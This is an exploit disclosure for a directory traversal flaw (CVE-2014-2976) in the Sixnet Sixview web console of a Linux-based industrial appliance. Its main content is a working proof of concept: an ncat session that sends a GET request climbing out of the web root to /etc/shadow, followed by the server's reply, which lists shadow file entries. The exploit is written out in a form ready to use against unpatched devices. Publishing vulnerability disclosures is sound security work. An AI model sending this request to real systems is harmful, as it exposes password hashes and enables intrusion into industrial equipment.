#Exploit Title: Sixnet sixview web console directory traversal
#Date: 2014-04-21
#Exploit Author: daniel svartman
#Vendor Homepage: www.sixnet.com
#Software Link: Not available, hardware piece - appliance
#Version: 2.4.1
#Tested on: Sixnet Sixview web console  (Linux based appliance)
#CVE : 2014-2976


PoV, Sixnet sixview web console handle requests through HTTP on port 18081.
These requests can be received either through GET or POST requests.
I discovered that GET requests are not validated at the server side,
allowing an attacker to request arbitrary files from the supporting OS.

Below is an example of the affected URL and the received answer using
netcat:


ncat  <HOSTNAME> 18081
GET /../../../../../../../../../../etc/shadow HTTP/1.1


HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Type: text/html
Keep-Alive: timeout=15, max=50
Date: <SNIP>
Last-Modified: <SNIP>
Content-Length: 1025

root:<REMOVED>:15655:0:99999:7:::
bin:*:15513:0:99999:7:::
daemon:*:15513:0:99999:7:::
adm:*:15513:0:99999:7:::
lp:*:15513:0:99999:7:::
sync:*:15513:0:99999:7:::
shutdown:*:15513:0:99999:7:::
halt:*:15513:0:99999:7:::
mail:*:15513:0:99999:7:::
uucp:*:15513:0:99999:7:::
<SNIP>